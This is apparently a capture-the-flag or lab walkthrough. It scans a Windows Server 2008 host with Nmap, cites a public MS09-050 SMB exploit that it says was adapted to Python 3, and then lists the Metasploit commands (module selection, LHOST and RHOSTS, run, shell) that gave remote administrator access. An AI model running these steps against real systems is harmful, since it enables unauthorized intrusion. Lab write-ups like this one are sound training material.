- We begin by performing our Nmap scan:

nmap -p- -sV 192.168.129.40
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 13:01 EST
Nmap scan report for 192.168.129.40
Host is up (0.042s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

- We notice Microsoft DNS 6.0.6001 as a viable service and port. A quick google search demonstrates and exploit on exploit-db (https://www.exploit-db.com/exploits/40280).
- We have to edit the script to be updated to python3. This includes changing the payload strings to have "b" and pip'ing smb so our import statement works. We also change buffer to shell variable.
- We then run the script and get a listener. This works, but fails to allow us to send any commands.
- We pivot to using metasploit:
sudo msfconsole
search ms09-050
use 0
- We then 'show options' to see what we can change. We change our LHOST to tun0 and RHOSTS to the IP we are cracking.
set LHOST tun0
set RHOSTS <ip>
- Now that our variables are set, the payload has been editted by msf6 and run.
run
shell
- This grants us access to the system. We now cd C:\Users\Administrator\Desktop to get the flag.
